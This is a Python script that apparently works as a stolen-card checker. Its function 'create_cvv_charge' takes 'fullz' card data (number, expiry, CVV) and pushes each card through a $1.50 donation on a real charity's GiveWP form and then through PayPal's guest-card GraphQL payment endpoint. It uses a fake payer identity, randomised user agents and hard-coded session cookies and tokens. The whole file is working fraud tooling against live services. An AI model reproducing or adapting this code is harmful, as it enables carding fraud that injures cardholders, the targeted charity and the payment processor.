import asyncio
from fake_useragent import UserAgent
from FUNC.defs import *
import re
from bs4 import BeautifulSoup






def extract_facilitator_access_token(response):
    try:
        if response.status_code == 200:
            match = re.search(r'facilitatorAccessToken":"([^"]+)"', response.text)
            if match:
                facilitator_access_token = match.group(1)
                return facilitator_access_token
            else:
                return "facilitatorAccessToken not found in the response."
        else:
            return f"Failed to retrieve the response. Status code: {response.status_code}"
    except Exception as e:
        return f"An error occurred: {str(e)}"



async def create_cvv_charge(fullz , session):
    try:
        cc , mes , ano , cvv = fullz.split("|")
        user_agent=UserAgent().random
        # random_data          = await get_random_info(session)
        # fname                = random_data["fname"]
        # lname                = random_data["lname"]
        # email                = random_data["email"]
        # phone                = random_data["phone"]
        # add1                 = random_data["add1"]
        # city                 = random_data["city"]
        # state                = random_data["state"]
        # state_short          = random_data["state_short"]
        # zip_code             = random_data["zip"]
        # user_agent           = UserAgent().random

 # 1st requests...............................................

        cookies = {
            'enforce_policy': 'ccpa',
            'cookie_check': 'yes',
            'd_id': '3b1e8e2ce8804b9daefc3fd4394268841707458408252',
            'KHcl0EuY7AKSMgfvHl7J5E7hPtK': 'UXLAp1kemd2lL6BxUVveLRSHRf2J9XgPjGhZdxfiatZabSWQtu8O30jfEREDQdfg9G4mAHaO_Feo8shX',
            'sc_f': 'JgjmvnTyI60DzcPbz4IkY6wi4zg9BpBxGghtENe5N_aYvRpoIPRhUugoe03cK3IEldoPDAPWODRFyG3RQEt0nAqOaDy-44th62SHCm',
            'rmuc': '61sNLuX7E3CN4tXc560Gj_VAU1uFT-0Az22CA9ITdkB2otO4pGjQ0qsffRSn0BtsCEacEdbcjeNtaqxhvhcug8ky2cAmGlsRQ-6_DwQXcq_KEB5rsjJMXLtnhN6Hx9lybZ13OmB5fXaFEXn-nuQgDBp38q_m_mdFPbHf4D5SFqer8UkV_IMtdAbmaIbTCPV4ke1iXG',
            'X-PP-ADS': 'AToBd7.FZRFWZnusmF4nukhN16hko2I',
            'cookie_prefs': 'T%3D1%2CP%3D1%2CF%3D1%2Ctype%3Dexplicit_banner',
            'login_email': 'crishniki158%40gmail.com',
            'x-csrf-jwt': 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0b2tlbiI6Ik9ZanpPaDRlOUY2ODF0MzUybFZLYTFDazM0RkFVa0JZR1JTR3ZPVGE0SlNubjZiX1VnaFZ5NXZTaHVoT01SN01PUmxmMzBpOE5ZcUFjX2Q3V0JvN2JlbUstNGNNZ0h0NlkwcVVFMllNNWdoMzF2bk5UUEFxRnUwZDRDLWtqdXRnQ2VncUl2d0dyUzdXc3lFUnhiendTejlPc0NHZVpDUWFDU0VJNHdPbzVDWC1MN2Jnb1ZXTjRGZGxSNnUiLCJpYXQiOjE3MDg0MTM3MTIsImV4cCI6MTcwODQxNzMxMn0.gQr2XHDiKNTcrTDNZjA8_P8sl6exF5f166ip2cuPU1Q',
            'LANG': 'en_US%3BUS',
            'SEGM': 'bRdV1vB0ebq9RKdAb3xSHowCi6QnnlCiDOLNk8i1mAuLl1vTbzHQwWajSsMe8mvoWiJtY1GnpzN4Y-sixGy7BQ',
            'nsid': 's%3AsHFIpAEx8UNeBo2WguKxID8-kzQIN3zy.Esn1vpxnQcXMKitNKQ7zaURWQKSHB%2BS0z82SvFm8iiU',
            'ts_c': 'vr%3D8c73ab5d18d0a553c868a5bcfa24dfcb%26vt%3Dc7a2bb7218d0aa388045d95af7d2c030',
            'sc_f': 'JgjmvnTyI60DzcPbz4IkY6wi4zg9BpBxGghtENe5N_aYvRpoIPRhUugoe03cK3IEldoPDAPWODRFyG3RQEt0nAqOaDy-44th62SHCm',
            'KHcl0EuY7AKSMgfvHl7J5E7hPtK': 'UXLAp1kemd2lL6BxUVveLRSHRf2J9XgPjGhZdxfiatZabSWQtu8O30jfEREDQdfg9G4mAHaO_Feo8shX',
            'AV894Kt2TSumQQrJwe-8mzmyREO': 'S23AAOxqyC0mH_C0P5v7dblx7-qAhyUfSgA2T9lh-B3Ev_nRZmTrGxHNP0pfAgCksUCezUnmW-iDnlg01x3BPjSl-AMfhjGbQ',
            'l7_az': 'dcg15.slc',
            'x-pp-s': 'eyJ0IjoiMTcwODQ1MjYxNzQwMyIsImwiOiIwIiwibSI6IjAifQ',
            'tsrce': 'smartcomponentnodeweb',
            'ts': 'vreXpYrS%3D1803147193%26vteXpYrS%3D1708454593%26vr%3D8c73ab5d18d0a553c868a5bcfa24dfcb%26vt%3Dc7a2bb7218d0aa388045d95af7d2c030%26vtyp%3Dreturn',
        }

        headers = {
            'authority': 'www.paypal.com',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-US,en;q=0.9',
            'referer': 'https://cayugacenters.org/',
            # 'sec-ch-ua': '"Not A(Brand";v="99", "Google Chrome";v="121", "Chromium";v="121"',
            # 'sec-ch-ua-mobile': '?0',
            # 'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'iframe',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'cross-site',
            'upgrade-insecure-requests': '1',
            'user-agent': user_agent,
        }

        params = {
            'style.label': 'paypal',
            'style.layout': 'vertical',
            'style.color': 'gold',
            'style.shape': 'rect',
            'style.tagline': 'false',
            'style.menuPlacement': 'below',
            'allowBillingPayments': 'true',
            'applePaySupport': 'false',
            'buttonSessionID': 'uid_b03fa0479d_mtg6mtm6mjg',
            'clientAccessToken': 'A21AANOw736q1lbMJCflauxDIu-2tkWcnu3S1b1f25Dvyl01sJrWvtsS5U_-AxKY1345p1U7Y3TtL4rGewzI0i10VodIvBllQ',
            'clientID': 'AaBYlaAu4Gteoq1HWwMOtoBmNvONpDKCBYgcWLcbUHPz9wghmpzAS9qVldjdCwiIMQtpHCSrTbOck1YA',
            'clientMetadataID': 'uid_814ad88db2_mtg6mdy6mza',
            'commit': 'true',
            'components.0': 'buttons',
            'currency': 'USD',
            'debug': 'false',
            'disableFunding.0': 'credit',
            'disableSetCookie': 'true',
            'enableFunding.0': 'venmo',
            'env': 'production',
            'experiment.enableVenmo': 'true',
            'flow': 'purchase',
            'fundingEligibility': 'eyJwYXlwYWwiOnsiZWxpZ2libGUiOnRydWUsInZhdWx0YWJsZSI6ZmFsc2V9LCJwYXlsYXRlciI6eyJlbGlnaWJsZSI6ZmFsc2UsInZhdWx0YWJsZSI6ZmFsc2UsInByb2R1Y3RzIjp7InBheUluMyI6eyJlbGlnaWJsZSI6ZmFsc2UsInZhcmlhbnQiOm51bGx9LCJwYXlJbjQiOnsiZWxpZ2libGUiOmZhbHNlLCJ2YXJpYW50IjpudWxsfSwicGF5bGF0ZXIiOnsiZWxpZ2libGUiOmZhbHNlLCJ2YXJpYW50IjpudWxsfX19LCJjYXJkIjp7ImVsaWdpYmxlIjp0cnVlLCJicmFuZGVkIjpmYWxzZSwiaW5zdGFsbG1lbnRzIjpmYWxzZSwidmVuZG9ycyI6eyJ2aXNhIjp7ImVsaWdpYmxlIjp0cnVlLCJ2YXVsdGFibGUiOnRydWV9LCJtYXN0ZXJjYXJkIjp7ImVsaWdpYmxlIjp0cnVlLCJ2YXVsdGFibGUiOnRydWV9LCJhbWV4Ijp7ImVsaWdpYmxlIjp0cnVlLCJ2YXVsdGFibGUiOnRydWV9LCJkaXNjb3ZlciI6eyJlbGlnaWJsZSI6dHJ1ZSwidmF1bHRhYmxlIjp0cnVlfSwiaGlwZXIiOnsiZWxpZ2libGUiOmZhbHNlLCJ2YXVsdGFibGUiOmZhbHNlfSwiZWxvIjp7ImVsaWdpYmxlIjpmYWxzZSwidmF1bHRhYmxlIjp0cnVlfSwiamNiIjp7ImVsaWdpYmxlIjpmYWxzZSwidmF1bHRhYmxlIjp0cnVlfX0sImd1ZXN0RW5hYmxlZCI6dHJ1ZX0sInZlbm1vIjp7ImVsaWdpYmxlIjp0cnVlLCJ2YXVsdGFibGUiOnRydWV9LCJpdGF1Ijp7ImVsaWdpYmxlIjpmYWxzZX0sImNyZWRpdCI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJhcHBsZXBheSI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJzZXBhIjp7ImVsaWdpYmxlIjpmYWxzZX0sImlkZWFsIjp7ImVsaWdpYmxlIjpmYWxzZX0sImJhbmNvbnRhY3QiOnsiZWxpZ2libGUiOmZhbHNlfSwiZ2lyb3BheSI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJlcHMiOnsiZWxpZ2libGUiOmZhbHNlfSwic29mb3J0Ijp7ImVsaWdpYmxlIjpmYWxzZX0sIm15YmFuayI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJwMjQiOnsiZWxpZ2libGUiOmZhbHNlfSwid2VjaGF0cGF5Ijp7ImVsaWdpYmxlIjpmYWxzZX0sInBheXUiOnsiZWxpZ2libGUiOmZhbHNlfSwiYmxpayI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJ0cnVzdGx5Ijp7ImVsaWdpYmxlIjpmYWxzZX0sIm94eG8iOnsiZWxpZ2libGUiOmZhbHNlfSwiYm9sZXRvIjp7ImVsaWdpYmxlIjpmYWxzZX0sImJvbGV0b2JhbmNhcmlvIjp7ImVsaWdpYmxlIjpmYWxzZX0sIm1lcmNhZG9wYWdvIjp7ImVsaWdpYmxlIjpmYWxzZX0sIm11bHRpYmFuY28iOnsiZWxpZ2libGUiOmZhbHNlfSwic2F0aXNwYXkiOnsiZWxpZ2libGUiOmZhbHNlfSwicGFpZHkiOnsiZWxpZ2libGUiOmZhbHNlfX0',
            'intent': 'capture',
            'locale.country': 'US',
            'locale.lang': 'en',
            'merchantID.0': '54YV9VAH2VCQ6',
            'platform': 'desktop',
            'remembered.0': 'venmo',
            'renderedButtons.0': 'paypal',
            'renderedButtons.1': 'venmo',
            'renderedButtons.2': 'card',
            'sessionID': 'uid_814ad88db2_mtg6mdy6mza',
            'sdkCorrelationID': '060a26a52668b',
            'sdkMeta': 'eyJ1cmwiOiJodHRwczovL3d3dy5wYXlwYWwuY29tL3Nkay9qcz9jbGllbnQtaWQ9QWFCWWxhQXU0R3Rlb3ExSFd3TU90b0JtTnZPTnBES0NCWWdjV0xjYlVIUHo5d2dobXB6QVM5cVZsZGpkQ3dpSU1RdHBIQ1NyVGJPY2sxWUEmbWVyY2hhbnQtaWQ9NTRZVjlWQUgyVkNRNiZjb21wb25lbnRzPWJ1dHRvbnMmZGlzYWJsZS1mdW5kaW5nPWNyZWRpdCZpbnRlbnQ9Y2FwdHVyZSZ2YXVsdD1mYWxzZSZjdXJyZW5jeT1VU0QmZW5hYmxlLWZ1bmRpbmc9dmVubW8iLCJhdHRycyI6eyJkYXRhLXBhcnRuZXItYXR0cmlidXRpb24taWQiOiJHaXZlV1BfU1BfUENQIiwiZGF0YS11aWQiOiJ1aWRfeXByeGJwbG1pdGx2dmZsd3lkdmhydWlzYXZmbGJnIn19',
            'sdkVersion': '5.0.423',
            'storageID': 'uid_851bdbd9b8_mtg6mdy6mza',
            'supportedNativeBrowser': 'false',
            'supportsPopups': 'true',
            'vault': 'false',
        }

        response = await session.get('https://www.paypal.com/smart/buttons', params=params, cookies=cookies, headers=headers)

        bearer_token = extract_facilitator_access_token(response)
        # print(bearer_token)



        # 2nd requests...............................................


        cookies = {
            '_ga': 'GA1.1.1283062997.1708452369',
            '_gcl_au': '1.1.354734122.1708452372',
            '_gcl_aw': 'GCL.1708452374.CjwKCAiAuNGuBhAkEiwAGId4ahCAu5U2IaSW8_UvnB2cvaZBrZXaXa3cxnRet2tjgT-2o0LRJzYhQxoC3qMQAvD_BwE',
            '_fbp': 'fb.1.1708452374209.1728618558',
            '_ga_8RT5MJD7QD': 'GS1.1.1708452368.1.1.1708452805.41.0.0',
        }

        headers = {
            'authority': 'cayugacenters.org',
            'accept': '*/*',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'multipart/form-data; boundary=----WebKitFormBoundaryP7xU4o3YqFBbBjOY',
            'origin': 'https://cayugacenters.org',
            'referer': 'https://cayugacenters.org/give/donate-page-2023?giveDonationFormInIframe=1',
            # 'sec-ch-ua': '"Not A(Brand";v="99", "Google Chrome";v="121", "Chromium";v="121"',
            # 'sec-ch-ua-mobile': '?0',
            # 'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': user_agent,
        }

        params = {
            'action': 'give_paypal_commerce_create_order',
        }

        files = {
            'give-honeypot': (None, ''),
            'give-form-id-prefix': (None, '10748-1'),
            'give-form-id': (None, '10748'),
            'give-form-title': (None, 'Donate Page'),
            'give-current-url': (None, 'https://cayugacenters.org/donate/'),
            'give-form-url': (None, 'https://cayugacenters.org/give/donate-page-2023/'),
            'give-form-minimum': (None, '1.50'),
            'give-form-maximum': (None, '200000.00'),
            'give-form-hash': (None, '85e62c247f'),
            'give-price-id': (None, 'custom'),
            'give-amount': (None, '1.50'),
            'give_first': (None, 'James M'),
            'give_last': (None, 'Fueger'),
            'give_company_option': (None, 'no'),
            'give_company_name': (None, ''),
            'give_email': (None, 'crishniki158@gmail.com'),
            'give_anonymous_donation': (None, '1'),
            'give_comment': (None, ''),
            'payment-mode': (None, 'paypal-commerce'),
            'give-gateway': (None, 'paypal-commerce'),
            'give_embed_form': (None, '1'),
        }

        response = await session.post(
            'https://cayugacenters.org/wp-admin/admin-ajax.php',
            params=params,
            cookies=cookies,
            headers=headers,
            files=files,
        )
            

 
        try:
            token = response.json()['data']['id']
            # print(f'token: {token}')
        except:
            return response.text




   # 3d requests...............................................

        cookies = {
            'enforce_policy': 'ccpa',
            'cookie_check': 'yes',
            'd_id': '3b1e8e2ce8804b9daefc3fd4394268841707458408252',
            'KHcl0EuY7AKSMgfvHl7J5E7hPtK': 'UXLAp1kemd2lL6BxUVveLRSHRf2J9XgPjGhZdxfiatZabSWQtu8O30jfEREDQdfg9G4mAHaO_Feo8shX',
            'sc_f': 'JgjmvnTyI60DzcPbz4IkY6wi4zg9BpBxGghtENe5N_aYvRpoIPRhUugoe03cK3IEldoPDAPWODRFyG3RQEt0nAqOaDy-44th62SHCm',
            'rmuc': '61sNLuX7E3CN4tXc560Gj_VAU1uFT-0Az22CA9ITdkB2otO4pGjQ0qsffRSn0BtsCEacEdbcjeNtaqxhvhcug8ky2cAmGlsRQ-6_DwQXcq_KEB5rsjJMXLtnhN6Hx9lybZ13OmB5fXaFEXn-nuQgDBp38q_m_mdFPbHf4D5SFqer8UkV_IMtdAbmaIbTCPV4ke1iXG',
            'X-PP-ADS': 'AToBd7.FZRFWZnusmF4nukhN16hko2I',
            'cookie_prefs': 'T%3D1%2CP%3D1%2CF%3D1%2Ctype%3Dexplicit_banner',
            'login_email': 'crishniki158%40gmail.com',
            'x-csrf-jwt': 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0b2tlbiI6Ik9ZanpPaDRlOUY2ODF0MzUybFZLYTFDazM0RkFVa0JZR1JTR3ZPVGE0SlNubjZiX1VnaFZ5NXZTaHVoT01SN01PUmxmMzBpOE5ZcUFjX2Q3V0JvN2JlbUstNGNNZ0h0NlkwcVVFMllNNWdoMzF2bk5UUEFxRnUwZDRDLWtqdXRnQ2VncUl2d0dyUzdXc3lFUnhiendTejlPc0NHZVpDUWFDU0VJNHdPbzVDWC1MN2Jnb1ZXTjRGZGxSNnUiLCJpYXQiOjE3MDg0MTM3MTIsImV4cCI6MTcwODQxNzMxMn0.gQr2XHDiKNTcrTDNZjA8_P8sl6exF5f166ip2cuPU1Q',
            'LANG': 'en_US%3BUS',
            'SEGM': 'bRdV1vB0ebq9RKdAb3xSHowCi6QnnlCiDOLNk8i1mAuLl1vTbzHQwWajSsMe8mvoWiJtY1GnpzN4Y-sixGy7BQ',
            'nsid': 's%3AsHFIpAEx8UNeBo2WguKxID8-kzQIN3zy.Esn1vpxnQcXMKitNKQ7zaURWQKSHB%2BS0z82SvFm8iiU',
            'ts_c': 'vr%3D8c73ab5d18d0a553c868a5bcfa24dfcb%26vt%3Dc7a2bb7218d0aa388045d95af7d2c030',
            'sc_f': 'JgjmvnTyI60DzcPbz4IkY6wi4zg9BpBxGghtENe5N_aYvRpoIPRhUugoe03cK3IEldoPDAPWODRFyG3RQEt0nAqOaDy-44th62SHCm',
            'KHcl0EuY7AKSMgfvHl7J5E7hPtK': 'UXLAp1kemd2lL6BxUVveLRSHRf2J9XgPjGhZdxfiatZabSWQtu8O30jfEREDQdfg9G4mAHaO_Feo8shX',
            'AV894Kt2TSumQQrJwe-8mzmyREO': 'S23AAOxqyC0mH_C0P5v7dblx7-qAhyUfSgA2T9lh-B3Ev_nRZmTrGxHNP0pfAgCksUCezUnmW-iDnlg01x3BPjSl-AMfhjGbQ',
            'l7_az': 'dcg14.slc',
            'x-pp-s': 'eyJ0IjoiMTcwODQ1MzI4OTU3MCIsImwiOiIwIiwibSI6IjAifQ',
            'tsrce': 'graphqlnodeweb',
            'ts': 'vreXpYrS%3D1803147689%26vteXpYrS%3D1708455089%26vr%3D8c73ab5d18d0a553c868a5bcfa24dfcb%26vt%3Dc7a2bb7218d0aa388045d95af7d2c030%26vtyp%3Dreturn',
        }

        headers = {
            'authority': 'www.paypal.com',
            'accept': '*/*',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'application/json',
            'origin': 'https://www.paypal.com',
            'paypal-client-context': token,
            'paypal-client-metadata-id': token,
            'referer': f'https://www.paypal.com/smart/card-fields?sessionID=uid_814ad88db2_mtg6mdy6mza&buttonSessionID=uid_b03fa0479d_mtg6mtm6mjg&locale.x=en_US&commit=true&env=production&sdkMeta=eyJ1cmwiOiJodHRwczovL3d3dy5wYXlwYWwuY29tL3Nkay9qcz9jbGllbnQtaWQ9QWFCWWxhQXU0R3Rlb3ExSFd3TU90b0JtTnZPTnBES0NCWWdjV0xjYlVIUHo5d2dobXB6QVM5cVZsZGpkQ3dpSU1RdHBIQ1NyVGJPY2sxWUEmbWVyY2hhbnQtaWQ9NTRZVjlWQUgyVkNRNiZjb21wb25lbnRzPWJ1dHRvbnMmZGlzYWJsZS1mdW5kaW5nPWNyZWRpdCZpbnRlbnQ9Y2FwdHVyZSZ2YXVsdD1mYWxzZSZjdXJyZW5jeT1VU0QmZW5hYmxlLWZ1bmRpbmc9dmVubW8iLCJhdHRycyI6eyJkYXRhLXBhcnRuZXItYXR0cmlidXRpb24taWQiOiJHaXZlV1BfU1BfUENQIiwiZGF0YS11aWQiOiJ1aWRfeXByeGJwbG1pdGx2dmZsd3lkdmhydWlzYXZmbGJnIn19&disable-card=&token={token}',
            # 'sec-ch-ua': '"Not A(Brand";v="99", "Google Chrome";v="121", "Chromium";v="121"',
            # 'sec-ch-ua-mobile': '?0',
            # 'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': user_agent,
            'x-app-name': 'standardcardfields',
            'x-country': 'US',
        }

        json_data = {
            'query': '\n        mutation payWithCard(\n            $token: String!\n            $card: CardInput!\n            $phoneNumber: String\n            $firstName: String\n            $lastName: String\n            $shippingAddress: AddressInput\n            $billingAddress: AddressInput\n            $email: String\n            $currencyConversionType: CheckoutCurrencyConversionType\n            $installmentTerm: Int\n        ) {\n            approveGuestPaymentWithCreditCard(\n                token: $token\n                card: $card\n                phoneNumber: $phoneNumber\n                firstName: $firstName\n                lastName: $lastName\n                email: $email\n                shippingAddress: $shippingAddress\n                billingAddress: $billingAddress\n                currencyConversionType: $currencyConversionType\n                installmentTerm: $installmentTerm\n            ) {\n                flags {\n                    is3DSecureRequired\n                }\n                cart {\n                    intent\n                    cartId\n                    buyer {\n                        userId\n                        auth {\n                            accessToken\n                        }\n                    }\n                    returnUrl {\n                        href\n                    }\n                }\n                paymentContingencies {\n                    threeDomainSecure {\n                        status\n                        method\n                        redirectUrl {\n                            href\n                        }\n                        parameter\n                    }\n                }\n            }\n        }\n        ',
            'variables': {
                'token': token,
                'card': {
                    'cardNumber': cc,
                    'expirationDate': f'{mes}/{ano}',
                    'postalCode': '91754',
                    'securityCode': cvv,
                },
                'phoneNumber': '3232648426',
                'firstName': 'James M',
                'lastName': 'Fueger',
                'billingAddress': {
                    'givenName': 'James M',
                    'familyName': 'Fueger',
                    'line1': None,
                    'line2': None,
                    'city': None,
                    'state': None,
                    'postalCode': '91754',
                    'country': 'US',
                },
                'email': 'crishniki158@gmail.com',
                'currencyConversionType': 'PAYPAL',
            },
            'operationName': None,
        }

        response = await session.post(
            'https://www.paypal.com/graphql?fetch_credit_form_submit',
            cookies=cookies,
            headers=headers,
            json=json_data,
        )

        # try:
        #     # result = response.json()['data']
        #     result = response.json()['data']['receipt']['processingError']['code']
        #     # print(result)
        #     return result
        # except:
        #     return response



        await asyncio.sleep(0.5)
        return response

    except Exception as e:
        return str(e)
    



